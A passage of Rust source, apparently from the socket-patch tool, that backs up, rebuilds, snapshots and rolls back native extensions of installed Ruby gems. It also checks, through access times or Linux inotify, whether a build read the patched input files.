/// The artifacts of the extension dir `dir`: its files ([`tree_files`]),
/// RubyGems' metadata files at the top level aside.
fn artifact_rels(dir: &Path) -> Vec<String> {
    tree_files(dir)
        .into_iter()
        .filter(|rel| !EXT_DIR_METADATA.contains(&rel.as_str()) && rel != MARKER_FILE)
        .collect()
}

/// An extension-dir artifact's copy in the gem's require dir, relative to
/// the gem dir (`a/a.so` → `lib/a/a.so`). `None` when the require dir is
/// not inside the gem dir.
fn lib_rel(probe: &Probe, rel: &str) -> Option<String> {
    let lib = probe.lib_dir.strip_prefix(&probe.gem_dir).ok()?;
    let s = lib
        .join(rel)
        .components()
        .map(|c| c.as_os_str().to_string_lossy().into_owned())
        .collect::<Vec<_>>()
        .join("/");
    is_safe_relative_subpath(&s).then_some(s)
}

/// A fresh copy of the tree `from` at `to` (replacing it).
fn copy_tree_sync(from: &Path, to: &Path) -> std::io::Result<()> {
    crate::patch::copy_tree::copy_tree_blocking(from, to, None)
}

/// Replace `dst` through a stage beside it and a rename, never rewriting
/// its inode: a running Ruby may have the old `.so` / `.bundle` mapped, and
/// rewriting those pages under it crashes it. `fill` writes the stage.
fn replace_file(
    dst: &Path,
    fill: impl FnOnce(&Path) -> std::io::Result<()>,
) -> std::io::Result<()> {
    let leaf = dst
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    let stage = dst.with_file_name(format!(".{leaf}.socket-patch-stage"));
    if let Some(parent) = dst.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let _ = std::fs::remove_file(&stage);
    let filled = fill(&stage).and_then(|()| std::fs::rename(&stage, dst));
    if filled.is_err() {
        let _ = std::fs::remove_file(&stage);
    }
    filled
}

fn remove_dir_if_exists(dir: &Path) -> std::io::Result<()> {
    match std::fs::symlink_metadata(dir) {
        Ok(_) => crate::patch::copy_tree::force_remove_dir_all(dir),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(e),
    }
}

/// The backup's description.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BackupInfo {
    /// As [`BuildMarker::extension_dir`].
    extension_dir: String,
    /// The extension dir existed (its tree is under `ext/`).
    had_extension_dir: bool,
    /// The files of the gem dir backed up under `lib/` (paths relative to
    /// the gem dir): the lib copies of the extension dir's artifacts, and
    /// every file of the gem's own tree an in-place build replaced or
    /// removed ([`back_up_tree_changes`]).
    lib_files: Vec<String>,
    /// The files an in-place build added to the gem's own tree (paths
    /// relative to the gem dir): `rollback` removes them.
    #[serde(default)]
    created_files: Vec<String>,
    /// The backup is of a precompiled copy: `lib_files` are the prebuilt
    /// binaries a build of the source gem replaced, and there is no
    /// extension dir.
    #[serde(default)]
    grafted: bool,
    /// Build inputs of the record that the installed copy did not hold and
    /// the patch wrote into it (normalized paths): `rollback` removes them
    /// instead of restoring content the copy never held
    /// ([`rollback_files`]).
    #[serde(default)]
    absent_files: Vec<String>,
}

/// [`BuildMarker::extension_dir`] for `ext_dir` (one of the copy's
/// installed extension dirs, [`find_ruby`]): relative to `home`, compared
/// canonically too (Ruby and the crawler may spell the same dir
/// differently through a symlink: `/tmp` vs `/private/tmp`), so the
/// record survives the project moving.
fn ext_dir_label(home: &Path, ext_dir: &Path) -> String {
    let canonical_rel = || {
        let (home, ext) = (canonical(home)?, canonical(ext_dir)?);
        ext.strip_prefix(&home).ok().map(Path::to_path_buf)
    };
    let rel = ext_dir
        .strip_prefix(home)
        .ok()
        .map(Path::to_path_buf)
        .or_else(canonical_rel);
    match rel.as_deref().ok_or(()) {
        Ok(rel) => rel
            .components()
            .map(|c| c.as_os_str().to_string_lossy().into_owned())
            .collect::<Vec<_>>()
            .join("/"),
        Err(_) => ext_dir.display().to_string(),
    }
}

/// Back up the original build of `copy` (its extension dir and the lib
/// copies of its artifacts) to [`BACKUP_DIR`], unless a backup exists or the
/// current build is one socket-patch made (a marker exists: its original is
/// gone). Staged and renamed into place, so a backup dir is always whole.
/// The backup also lists `absent`, the record's files the copy did not hold
/// ([`files_as_installed`]); one that exists learns of those it does not
/// list. `Ok(true)` when this call made the backup.
fn back_up_original(copy: &GemCopy, probe: &Probe, absent: &[String]) -> std::io::Result<bool> {
    let backup = copy.gem_dir.join(BACKUP_DIR);
    // "Not there" is the one answer a new backup is made on: a backup or a
    // marker that cannot be probed may hold the original build already.
    if try_entry_type(&backup)?.is_some() {
        note_absent_files(&backup, absent)?;
        return Ok(false);
    }
    if try_entry_type(&copy.gem_dir.join(MARKER_FILE))?.is_some() {
        return Ok(false);
    }
    let stage = copy.gem_dir.join(format!("{BACKUP_DIR}.tmp"));
    remove_dir_if_exists(&stage)?;
    std::fs::create_dir_all(&stage)?;
    let had_extension_dir = probe.extension_dir.is_dir();
    let mut lib_files = Vec::new();
    if had_extension_dir {
        copy_tree_sync(&probe.extension_dir, &stage.join("ext"))?;
        for rel in artifact_rels(&probe.extension_dir) {
            let Some(lib) = lib_rel(probe, &rel) else {
                continue;
            };
            // Only a regular file: a FIFO there would block the read.
            let src = copy.gem_dir.join(&lib);
            if let Ok(bytes) = read_regular_to_bytes_sync(&src) {
                let dst = stage.join("lib").join(&lib);
                if let Some(parent) = dst.parent() {
                    std::fs::create_dir_all(parent)?;
                }
                std::fs::write(&dst, bytes)?;
                // The copy's mode too (RubyGems installs a shared object
                // executable), so the restore gives back the file as it was.
                if let Ok(meta) = std::fs::metadata(&src) {
                    let _ = std::fs::set_permissions(&dst, meta.permissions());
                }
                lib_files.push(lib);
            }
        }
    }
    let info = BackupInfo {
        extension_dir: ext_dir_label(&copy.home, &probe.extension_dir),
        had_extension_dir,
        lib_files,
        absent_files: absent.to_vec(),
        ..BackupInfo::default()
    };
    write_backup_info(&stage, &info)?;
    std::fs::rename(&stage, &backup)?;
    Ok(true)
}

/// The description of the backup dir `backup`, when it has a readable one.
fn read_backup_info(backup: &Path) -> Option<BackupInfo> {
    try_read_backup_info(backup).ok().flatten()
}

/// [`read_backup_info`] for a caller that is about to add to the backup,
/// and must not take a description it cannot read for none: `Ok(None)`
/// only when the backup has no description file. One that cannot be
/// probed, read or parsed is an error naming it. (A rollback removes what
/// the marker lists and the backup does not hold: a build recorded in the
/// marker and not in a backup that is there would lose its files to it.)
fn try_read_backup_info(backup: &Path) -> std::io::Result<Option<BackupInfo>> {
    let path = backup.join(BACKUP_INFO);
    if try_entry_type(&path)?.is_none() {
        return Ok(None);
    }
    let unreadable = |why: String| {
        std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            format!(
                "{} could not be read as a backup's description ({why})",
                path.display()
            ),
        )
    };
    let bytes = read_regular_to_bytes_sync(&path).map_err(|e| unreadable(e.to_string()))?;
    serde_json::from_slice(&bytes)
        .map(Some)
        .map_err(|e| unreadable(e.to_string()))
}

/// Write a backup's description into `dir`: staged beside its place and
/// renamed, so it is always whole.
fn write_backup_info(dir: &Path, info: &BackupInfo) -> std::io::Result<()> {
    let stage = dir.join(format!("{BACKUP_INFO}.tmp"));
    std::fs::write(
        &stage,
        serde_json::to_vec_pretty(info).map_err(std::io::Error::other)?,
    )?;
    std::fs::rename(&stage, dir.join(BACKUP_INFO))
}

/// Add `absent` (files a later apply writes into a copy that did not hold
/// them) to an existing backup's list, so `rollback` removes them too. A
/// backup that is not a dir this tool wrote is left as it is.
fn note_absent_files(backup: &Path, absent: &[String]) -> std::io::Result<()> {
    if absent.is_empty() || !is_real_dir(backup) {
        return Ok(());
    }
    let Some(mut info) = try_read_backup_info(backup)? else {
        return Ok(());
    };
    let before = info.absent_files.len();
    for path in absent {
        if !info.absent_files.contains(path) {
            info.absent_files.push(path.clone());
        }
    }
    if info.absent_files.len() != before {
        write_backup_info(backup, &info)?;
    }
    Ok(())
}

/// One lib copy read into memory: gem-dir-relative path, bytes, mode.
type LibSnapshot = (String, Vec<u8>, std::fs::Permissions);

/// The lib copies of an extension dir's artifacts, read into memory.
fn snapshot_lib_copies(copy: &GemCopy, probe: &Probe, rels: &[String]) -> Vec<LibSnapshot> {
    rels.iter()
        .filter_map(|rel| lib_rel(probe, rel))
        .filter_map(|lib| {
            let path = copy.gem_dir.join(&lib);
            let perms = std::fs::metadata(&path).ok()?.permissions();
            let bytes = read_regular_to_bytes_sync(&path).ok()?;
            Some((lib, bytes, perms))
        })
        .collect()
}

/// State a build moved aside, to put back if it fails.
struct Aside {
    /// The previous extension dir, parked beside itself
    /// ([`parked_build_path`]).
    old_ext: Option<PathBuf>,
    /// The previous build's lib copies.
    lib: Vec<LibSnapshot>,
    /// The rebuild lock on the parked dir ([`lock_build_dir`]), held until
    /// the build is committed or put back.
    _lock: Option<std::fs::File>,
}

/// Move the current build out of the way of a fresh one.
///
/// Everything a run that dies mid-build needs put right stays on disk:
/// the previous build is parked, not deleted, and its marker (if it had
/// one) is left where it is until a finished build's marker replaces it,
/// so [`recover_interrupted_rebuild`] can put the copy back together.
fn set_aside(copy: &GemCopy, probe: &Probe) -> std::io::Result<Aside> {
    let ext = &probe.extension_dir;
    let rels = if ext.is_dir() {
        artifact_rels(ext)
    } else {
        Vec::new()
    };
    let lib = snapshot_lib_copies(copy, probe, &rels);
    let (old_ext, lock) = if ext.is_dir() {
        // Locked before it is parked: from the moment the parked dir is
        // there, another run sees a rebuild that is still alive.
        let lock = lock_build_dir(ext)?;
        let parked = parked_build_path(ext);
        remove_dir_if_exists(&parked)?;
        std::fs::rename(ext, &parked)?;
        (Some(parked), lock)
    } else {
        (None, None)
    };
    Ok(Aside {
        old_ext,
        lib,
        _lock: lock,
    })
}

/// Undo a failed build: drop what it produced (its extension dir and any lib
/// copy it created), and put the previous build back. Its marker never left.
fn put_back(copy: &GemCopy, probe: &Probe, aside: Aside) -> std::io::Result<()> {
    let ext = &probe.extension_dir;
    let produced = if ext.is_dir() {
        artifact_rels(ext)
    } else {
        Vec::new()
    };
    let kept: Vec<&str> = aside.lib.iter().map(|(p, _, _)| p.as_str()).collect();
    for rel in &produced {
        if let Some(lib) = lib_rel(probe, rel) {
            if !kept.contains(&lib.as_str()) {
                let _ = std::fs::remove_file(copy.gem_dir.join(&lib));
            }
        }
    }
    remove_dir_if_exists(ext)?;
    if let Some(old) = &aside.old_ext {
        std::fs::rename(old, ext)?;
    }
    for (lib, bytes, perms) in &aside.lib {
        replace_file(&copy.gem_dir.join(lib), |stage| {
            std::fs::write(stage, bytes)?;
            std::fs::set_permissions(stage, perms.clone())
        })?;
    }
    Ok(())
}

/// After a successful build: record the marker, drop the old build.
fn commit_build(
    copy: &GemCopy,
    probe: &Probe,
    scope: &NativeScope,
    files: &HashMap<String, PatchFileInfo>,
    aside: &Aside,
    in_tree: &[String],
) -> std::io::Result<()> {
    let ext = &probe.extension_dir;
    let mut marker = BuildMarker {
        schema: MARKER_SCHEMA,
        extension_dir: ext_dir_label(&copy.home, ext),
        ..BuildMarker::default()
    };
    for key in &scope.inputs {
        if let Some(info) = files.get(key) {
            marker.sources.insert(
                normalize_file_path(key).to_string(),
                info.after_hash.clone(),
            );
        }
    }
    for rel in artifact_rels(ext) {
        let hash = compute_file_git_sha256_sync(&ext.join(&rel))?;
        if let Some(lib) = lib_rel(probe, &rel) {
            if let Ok(lib_hash) = compute_file_git_sha256_sync(&copy.gem_dir.join(&lib)) {
                marker.lib_artifacts.insert(lib, lib_hash);
            }
        }
        marker.ext_artifacts.insert(rel, hash);
    }
    // What the build left in the gem's own tree for Ruby to load is
    // attested like the copies RubyGems makes there.
    for rel in in_tree {
        let hash = compute_file_git_sha256_sync(&copy.gem_dir.join(rel))?;
        marker.lib_artifacts.insert(rel.clone(), hash);
    }
    write_marker(copy, &marker)?;
    if let Some(old) = &aside.old_ext {
        let _ = remove_dir_if_exists(old);
    }
    Ok(())
}

/// Record `marker` in the gem dir: staged beside its place and renamed, so
/// a marker is always whole.
fn write_marker(copy: &GemCopy, marker: &BuildMarker) -> std::io::Result<()> {
    let bytes = serde_json::to_vec_pretty(marker).map_err(std::io::Error::other)?;
    let marker_path = copy.gem_dir.join(MARKER_FILE);
    let stage = copy.gem_dir.join(format!("{MARKER_FILE}.tmp"));
    let written =
        std::fs::write(&stage, bytes).and_then(|()| std::fs::rename(&stage, &marker_path));
    if written.is_err() {
        let _ = std::fs::remove_file(&stage);
    }
    written
}

/// Whether a gem-dir path is one of this module's own entries there
/// ([`OWN_ENTRY_PREFIX`]): never part of the gem's tree.
fn is_own_entry(rel: &str) -> bool {
    rel.split('/')
        .next()
        .is_some_and(|top| top.starts_with(OWN_ENTRY_PREFIX))
}

/// The files of the gem's own tree ([`tree_files`]), this module's entries
/// aside.
fn gem_tree_files(gem_dir: &Path) -> Vec<String> {
    tree_files(gem_dir)
        .into_iter()
        .filter(|rel| !is_own_entry(rel))
        .collect()
}

/// [`tree_files`] for a caller that acts on what the listing lacks (a file
/// that is not in a snapshot is removed; one that was not snapshotted
/// cannot be put back): `Err`, naming the tree, when any part of it cannot
/// be read, where `tree_files` leaves that part out. Only a `dir` that is
/// not there has no files.
fn try_tree_files(dir: &Path) -> std::io::Result<Vec<String>> {
    if try_entry_type(dir)?.is_none() {
        return Ok(Vec::new());
    }
    let mut files = Vec::new();
    for entry in walkdir::WalkDir::new(dir)
        .follow_links(false)
        .sort_by_file_name()
    {
        let entry = entry.map_err(|e| {
            let kind = e
                .io_error()
                .map_or(std::io::ErrorKind::Other, std::io::Error::kind);
            std::io::Error::new(kind, format!("{} could not be listed ({e})", dir.display()))
        })?;
        if !entry.file_type().is_file() {
            continue;
        }
        if let Ok(rel) = entry.path().strip_prefix(dir) {
            files.push(
                rel.components()
                    .map(|c| c.as_os_str().to_string_lossy().into_owned())
                    .collect::<Vec<_>>()
                    .join("/"),
            );
        }
    }
    Ok(files)
}

/// [`gem_tree_files`], failing where it would leave part of the tree out
/// ([`try_tree_files`]).
fn try_gem_tree_files(gem_dir: &Path) -> std::io::Result<Vec<String>> {
    Ok(try_tree_files(gem_dir)?
        .into_iter()
        .filter(|rel| !is_own_entry(rel))
        .collect())
}

/// The gem's own tree as it was before an in-place build: a copy of every
/// file, beside the parked build ([`tree_snapshot_path`]).
///
/// A build run in the installed tree writes there too: its objects and
/// Makefiles, and for a gem that loads its library from its own tree (an
/// FFI gem built with `ffi-compiler`, a Rakefile build), the compiled code
/// itself. Nothing says ahead of the build which files those are, so the
/// whole tree is kept until the build is committed or undone: a failed
/// build is undone from it ([`restore_tree`]), and a finished one backs up
/// what it replaced from it ([`back_up_tree_changes`]).
///
/// The record's own files are no part of it: the patch writes them and
/// `rollback` puts them back, before or after a build is undone, and a
/// snapshot that held them would undo that with it. Their paths are kept
/// beside the copies ([`SNAPSHOT_LEFT`]), so a later run knows them too.
///
/// It is taken while the parked build is locked and dropped before that
/// lock is, so one that is found without a parked build belongs to no run
/// ([`recover_interrupted_rebuild`]).
struct TreeSnapshot {
    dir: PathBuf,
    /// Gem-dir path → git-sha256, for every file copied.
    files: BTreeMap<String, String>,
    /// The record's files (gem-dir paths), left as they are.
    left: Vec<String>,
}

/// The copies of a [`TreeSnapshot`], inside its dir.
const SNAPSHOT_TREE: &str = "tree";
/// The paths a [`TreeSnapshot`] leaves alone, inside its dir: a JSON list.
const SNAPSHOT_LEFT: &str = "left.json";

/// What a build did to the gem's own tree, against its [`TreeSnapshot`].
#[derive(Debug, Default, PartialEq, Eq)]
struct TreeChanges {
    /// Files the tree held that the build replaced or removed.
    replaced: Vec<String>,
    /// Files the build added.
    created: Vec<String>,
}

/// Copy `from` to `to` with its mode, creating `to`'s directory.
/// The git-sha256 of what was copied.
fn copy_file_with_mode(from: &Path, to: &Path) -> std::io::Result<String> {
    if let Some(parent) = to.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let bytes = read_regular_to_bytes_sync(from)?;
    std::fs::write(to, &bytes)?;
    std::fs::set_permissions(to, std::fs::metadata(from)?.permissions())?;
    Ok(compute_git_sha256_from_bytes(&bytes))
}

/// Take the [`TreeSnapshot`] of `copy` beside its extension dir `ext`,
/// leaving the paths `left` out: staged and renamed into place, so a
/// snapshot dir is always whole.
fn snapshot_tree(copy: &GemCopy, ext: &Path, left: &[String]) -> std::io::Result<TreeSnapshot> {
    let dir = tree_snapshot_path(ext);
    let stage = tree_snapshot_stage(&dir);
    remove_dir_if_exists(&dir)?;
    remove_dir_if_exists(&stage)?;
    std::fs::create_dir_all(&stage)?;
    let taken = (|| {
        let mut files = BTreeMap::new();
        // The whole tree, or no snapshot: a file that is not in it is one
        // the undo of a failed build removes.
        for rel in try_gem_tree_files(&copy.gem_dir)? {
            if left.contains(&rel) {
                continue;
            }
            let src = copy.gem_dir.join(&rel);
            let hash = copy_file_with_mode(&src, &stage.join(SNAPSHOT_TREE).join(&rel))?;
            files.insert(rel, hash);
        }
        std::fs::write(
            stage.join(SNAPSHOT_LEFT),
            serde_json::to_vec(left).map_err(std::io::Error::other)?,
        )?;
        std::fs::rename(&stage, &dir)?;
        Ok(files)
    })();
    match taken {
        Ok(files) => Ok(TreeSnapshot {
            dir,
            files,
            left: left.to_vec(),
        }),
        Err(e) => {
            let _ = remove_dir_if_exists(&stage);
            Err(e)
        }
    }
}

/// The [`TreeChanges`] of `copy` since `snapshot` was taken.
fn tree_changes(copy: &GemCopy, snapshot: &TreeSnapshot) -> TreeChanges {
    let now: BTreeMap<String, Option<String>> = gem_tree_files(&copy.gem_dir)
        .into_iter()
        .filter(|rel| !snapshot.left.contains(rel))
        .map(|rel| {
            let hash = compute_file_git_sha256_sync(&copy.gem_dir.join(&rel)).ok();
            (rel, hash)
        })
        .collect();
    TreeChanges {
        replaced: snapshot
            .files
            .iter()
            .filter(|(rel, hash)| now.get(*rel).and_then(Option::as_ref) != Some(*hash))
            .map(|(rel, _)| rel.clone())
            .collect(),
        created: now
            .into_keys()
            .filter(|rel| !snapshot.files.contains_key(rel))
            .collect(),
    }
}

/// Put the gem's own tree back as the snapshot at `snapshot_dir` holds it:
/// files that are not in it go, files that differ from it or are gone come
/// back (through [`replace_file`]), and the snapshot is dropped. A file
/// that is as it was is not written, and the paths the snapshot left out
/// are not touched. A snapshot that does not say which those are is not
/// used: `Err`, with the tree as it is. Neither is one whose copies cannot
/// all be listed, nor is a tree that cannot be: every file the listing of
/// the snapshot lacks is removed, so a listing that left some out would
/// delete the gem's own files ([`try_tree_files`]). Nor is one that names a
/// file under a link in the gem dir, which would be written through it.
fn restore_tree(copy: &GemCopy, snapshot_dir: &Path) -> std::io::Result<()> {
    let left: Vec<String> = serde_json::from_slice(&read_regular_to_bytes_sync(
        &snapshot_dir.join(SNAPSHOT_LEFT),
    )?)
    .map_err(std::io::Error::other)?;
    let saved_tree = snapshot_dir.join(SNAPSHOT_TREE);
    let kept: std::collections::BTreeSet<String> =
        try_tree_files(&saved_tree)?.into_iter().collect();
    // Each file goes back by path. A snapshot this module took holds no
    // file under a link (links are not walked when it is taken), so one
    // that names such a path was not taken of this tree: a gem home can
    // come from the repository being scanned, with a snapshot planted
    // beside a parked build and a link in the gem dir to write through.
    // Checked for every file before any is removed or written.
    for rel in &kept {
        let path = copy.gem_dir.join(rel);
        if let Some(link) = crate::utils::containment::try_linked_level(&copy.gem_dir, &path)? {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                format!(
                    "{} is a symlink, and the snapshot at {} names {rel} under it",
                    link.display(),
                    snapshot_dir.display()
                ),
            ));
        }
    }
    for rel in try_gem_tree_files(&copy.gem_dir)? {
        if !kept.contains(&rel) && !left.contains(&rel) {
            std::fs::remove_file(copy.gem_dir.join(&rel))?;
        }
    }
    for rel in &kept {
        let (saved, path) = (saved_tree.join(rel), copy.gem_dir.join(rel));
        let same = is_real_file(&path)
            && compute_file_git_sha256_sync(&path).ok()
                == compute_file_git_sha256_sync(&saved).ok();
        if !same {
            replace_with_file(&saved, &path, None)?;
        }
    }
    remove_dir_if_exists(snapshot_dir)
}

/// Whether the in-place build that took the snapshot at `snapshot` was
/// committed: the extension dir `ext` is a finished build, and the copy's
/// marker was written after the snapshot was taken and still names, hash
/// for hash, what is in the gem's tree. ([`commit_build`] writes the
/// marker before it drops the parked build, and the snapshot goes after
/// both.)
///
/// With no marker file there, no build was recorded. A marker that cannot
/// be probed says neither: `Err`, and the tree is not touched on a guess.
fn build_committed_since(copy: &GemCopy, ext: &Path, snapshot: &Path) -> std::io::Result<bool> {
    let marker = copy.gem_dir.join(MARKER_FILE);
    if try_entry_type(&marker)?.is_none() {
        return Ok(false);
    }
    let written = |path: &Path| std::fs::symlink_metadata(path).and_then(|meta| meta.modified());
    let (Ok(marked), Ok(taken)) = (written(&marker), written(snapshot)) else {
        return Ok(false);
    };
    Ok(ext.join(BUILD_COMPLETE).is_file()
        && marked >= taken
        && read_marker_sync(&copy.gem_dir).is_some_and(|marker| {
            !marker.grafted
                && marker.lib_artifacts.iter().all(|(rel, hash)| {
                    is_safe_relative_subpath(rel)
                        && compute_file_git_sha256_sync(&copy.gem_dir.join(rel))
                            .is_ok_and(|now| &now == hash)
                })
        }))
}

/// Drop what a run that died left of a [`TreeSnapshot`] of `copy`, once no
/// parked build says a rebuild was under way: the tree it was taken of is
/// either untouched or the committed build's.
fn drop_stale_tree_snapshots(copy: &GemCopy) {
    for ext in extension_dir_slots(copy) {
        let snapshot = tree_snapshot_path(&ext);
        for dir in [tree_snapshot_stage(&snapshot), snapshot] {
            if is_real_dir(&dir) {
                let _ = remove_dir_if_exists(&dir);
            }
        }
    }
}

/// Add what an in-place build did to the gem's own tree (`changes`) to the
/// backup of the original build, so `rollback` undoes it
/// ([`restore_backup`]): the content each replaced file had before the
/// build, from `snapshot`, and the names of the files it added. The
/// products taken out of the build's way (`removed`) count as replaced
/// whether or not they came back with other bytes: the marker lists them,
/// and the restore removes whatever a marker lists that the backup does
/// not hold. A file the
/// backup already holds, or already lists as added by an earlier build, is
/// left as recorded: that is the original, and this build ran over
/// socket-patch's own. Without a backup of a build RubyGems made there is
/// nothing to add to (the original is gone, and `rollback` rebuilds).
///
/// "Without a backup" is a backup dir, or its description, that is not
/// there. One that is there and cannot be probed or read is an error: the
/// build is then not recorded, and is undone
/// ([`try_read_backup_info`]).
fn back_up_tree_changes(
    copy: &GemCopy,
    snapshot: &TreeSnapshot,
    removed: &[String],
    changes: &TreeChanges,
) -> std::io::Result<()> {
    let backup = copy.gem_dir.join(BACKUP_DIR);
    if !try_entry_type(&backup)?.is_some_and(|kind| kind.is_dir()) {
        return Ok(());
    }
    let Some(mut info) = try_read_backup_info(&backup)?.filter(|info| !info.grafted) else {
        return Ok(());
    };
    let before = (info.lib_files.len(), info.created_files.len());
    let recorded = |info: &BackupInfo, rel: &String| {
        info.lib_files.contains(rel) || info.created_files.contains(rel)
    };
    for rel in changes.replaced.iter().chain(removed) {
        if !recorded(&info, rel) {
            let saved = snapshot.dir.join(SNAPSHOT_TREE).join(rel);
            copy_file_with_mode(&saved, &backup.join("lib").join(rel))?;
            info.lib_files.push(rel.clone());
        }
    }
    for rel in &changes.created {
        if !recorded(&info, rel) {
            info.created_files.push(rel.clone());
        }
    }
    if before != (info.lib_files.len(), info.created_files.len()) {
        write_backup_info(&backup, &info)?;
    }
    Ok(())
}

/// The files an in-place build left in the gem's own tree for Ruby to load
/// ([`is_loadable`]), to attest in its marker: those of `changes`, the
/// products it was made to build again (`removed`), and those the backup
/// says an earlier build of socket-patch's replaced or added. A build that
/// writes the same bytes again changes none of the last two.
fn in_tree_artifacts(
    copy: &GemCopy,
    probe: &Probe,
    removed: &[String],
    changes: &TreeChanges,
) -> Vec<String> {
    let dlext = probe.facts.as_ref().map(|facts| facts.dlext.as_str());
    let recorded = read_backup_info(&copy.gem_dir.join(BACKUP_DIR))
        .filter(|info| !info.grafted)
        .map(|info| [info.lib_files, info.created_files].concat())
        .unwrap_or_default();
    let mut rels: Vec<String> = changes
        .replaced
        .iter()
        .chain(&changes.created)
        .chain(removed)
        .chain(&recorded)
        .filter(|rel| is_safe_relative_subpath(rel) && !is_own_entry(rel))
        .filter(|rel| is_loadable(rel, &probe.require_paths, dlext))
        .filter(|rel| is_real_file(&copy.gem_dir.join(rel)))
        .cloned()
        .collect();
    rels.sort();
    rels.dedup();
    rels
}

/// The access time a build input is given before its build: earlier than
/// any file's modification time, so that a filesystem that records reads
/// lazily (Linux `relatime`, APFS) records the first read after it.
fn unread_time() -> std::time::SystemTime {
    std::time::UNIX_EPOCH + Duration::from_secs(1_000_000_000)
}

fn accessed(path: &Path) -> Option<std::time::SystemTime> {
    std::fs::symlink_metadata(path).ok()?.accessed().ok()
}

/// Give `path` the access time [`unread_time`]. `false` when the file
/// cannot take it, or the filesystem does not keep it as given.
fn mark_unread(path: &Path) -> bool {
    let times = std::fs::FileTimes::new().set_accessed(unread_time());
    // A file's owner sets its times through any handle on Unix, and a
    // patched file can be read-only (it keeps the gem's mode); Windows
    // wants a handle opened for writing. Opening a file is not a read.
    let set = [false, true].into_iter().any(|write| {
        std::fs::OpenOptions::new()
            .read(!write)
            .write(write)
            .open(path)
            .is_ok_and(|file| file.set_times(times).is_ok())
    });
    set && accessed(path) == Some(unread_time())
}

/// Whether a read of a file in `dir` shows in its access time. A
/// filesystem mounted `noatime`, and Windows by default, record none.
fn records_reads(dir: &Path) -> bool {
    let probe = dir.join(".socket-patch-read-probe");
    let recorded = std::fs::write(&probe, b"probe").is_ok()
        && mark_unread(&probe)
        && std::fs::read(&probe).is_ok()
        && accessed(&probe).is_some_and(|at| at != unread_time());
    let _ = std::fs::remove_file(&probe);
    recorded
}

/// A kernel watch on files for being opened or read (Linux inotify). It
/// sees a read whatever the mount options: CI runners and container hosts
/// are often mounted `noatime`, where an access time says nothing.
#[cfg(target_os = "linux")]
struct OpenWatch(std::os::fd::OwnedFd);

#[cfg(target_os = "linux")]
impl OpenWatch {
    /// A watch on every one of `paths`, or none at all: a file that cannot
    /// be watched could be the one the build reads.
    fn on(paths: &[PathBuf]) -> Option<OpenWatch> {
        use std::os::fd::{AsRawFd, FromRawFd, OwnedFd};
        use std::os::unix::ffi::OsStrExt;
        // SAFETY: a plain syscall; the fd it returns is owned from here on.
        let raw = unsafe { libc::inotify_init1(libc::IN_NONBLOCK | libc::IN_CLOEXEC) };
        if raw < 0 {
            return None;
        }
        // SAFETY: `raw` is a fresh fd nothing else holds.
        let fd = unsafe { OwnedFd::from_raw_fd(raw) };
        for path in paths {
            let c_path = std::ffi::CString::new(path.as_os_str().as_bytes()).ok()?;
            // SAFETY: `c_path` is a NUL-terminated string that outlives the call.
            let watch = unsafe {
                libc::inotify_add_watch(
                    fd.as_raw_fd(),
                    c_path.as_ptr(),
                    libc::IN_OPEN | libc::IN_ACCESS,
                )
            };
            if watch < 0 {
                return None;
            }
        }
        Some(OpenWatch(fd))
    }

    /// Whether any watched file was opened, read or replaced since the
    /// watch was set (a replaced file ends its watch, which is an event
    /// too: nothing is concluded about a file that is no longer the one
    /// watched).
    fn fired(&self) -> bool {
        use std::os::fd::AsRawFd;
        let mut events = [0u8; 4096];
        // SAFETY: the buffer is valid for `events.len()` bytes; the fd is
        // non-blocking, so a queue with no event returns at once.
        let read =
            unsafe { libc::read(self.0.as_raw_fd(), events.as_mut_ptr().cast(), events.len()) };
        read > 0
    }
}

/// What tells, after a build, whether it read any of a record's build
/// inputs ([`watch_inputs`]).
struct InputWatch {
    /// The record's build inputs that are files under the gem dir (one the
    /// record deletes is not there to read).
    inputs: Vec<String>,
    /// Those given the access time [`unread_time`].
    marked: Vec<String>,
    #[cfg(target_os = "linux")]
    opens: Option<OpenWatch>,
}

/// Start watching the record's build inputs under `gem_dir` for a read,
/// right before a build of them: a kernel watch where there is one
/// ([`OpenWatch`]), and an access time in the past everywhere, for the
/// filesystems that record reads.
fn watch_inputs(gem_dir: &Path, scope: &NativeScope) -> InputWatch {
    let inputs: Vec<String> = scope
        .inputs
        .iter()
        .map(|key| normalize_file_path(key).to_string())
        .filter(|rel| is_safe_relative_subpath(rel) && is_real_file(&gem_dir.join(rel)))
        .collect();
    let marked = inputs
        .iter()
        .filter(|rel| mark_unread(&gem_dir.join(rel)))
        .cloned()
        .collect();
    // After the marks: setting one opens the file.
    #[cfg(target_os = "linux")]
    let opens = {
        let paths: Vec<PathBuf> = inputs.iter().map(|rel| gem_dir.join(rel)).collect();
        (!paths.is_empty()).then(|| OpenWatch::on(&paths)).flatten()
    };
    InputWatch {
        inputs,
        marked,
        #[cfg(target_os = "linux")]
        opens,
    }
}

/// The build inputs of a record that a build which has just exited cleanly
/// did not read, when it read NONE of them and that can be told (`watch`:
/// [`watch_inputs`]'s, set on `gem_dir` before the build; `probe_dir`: a
/// writable dir on the same filesystem).
///
/// A compiler reads what it compiles, and a build script reads the patch
/// files it applies. A build that opened none of the files the patch
/// changes compiled the same code it would have without them: the gem is
/// set up not to build that part of itself (the packed library of a gem
/// built against the system's copy), and the patch is not in what Ruby
/// loads. One read is enough to pass: the classification of inputs is
/// broad on purpose, and a build does not read every file a record
/// carries (a manifest listing the files it adds).
///
/// `None` wherever a read leaves no trace (no kernel watch, and a
/// filesystem that records no access): nothing is concluded from silence.
fn unread_inputs(gem_dir: &Path, watch: &InputWatch, probe_dir: &Path) -> Option<Vec<String>> {
    #[cfg(target_os = "linux")]
    if let Some(opens) = &watch.opens {
        return (!opens.fired()).then(|| watch.inputs.clone());
    }
    // Every input must have taken the mark: one that did not may be the
    // one the build read.
    if watch.inputs.is_empty() || watch.marked.len() != watch.inputs.len() {
        return None;
    }
    let read_any = watch
        .marked
        .iter()
        .any(|rel| accessed(&gem_dir.join(rel)) != Some(unread_time()));
    if read_any || !records_reads(probe_dir) {
        return None;
    }
    Some(watch.inputs.clone())
}

/// What is said of a build that read none of the record's build inputs,
/// after a message that has just listed them.
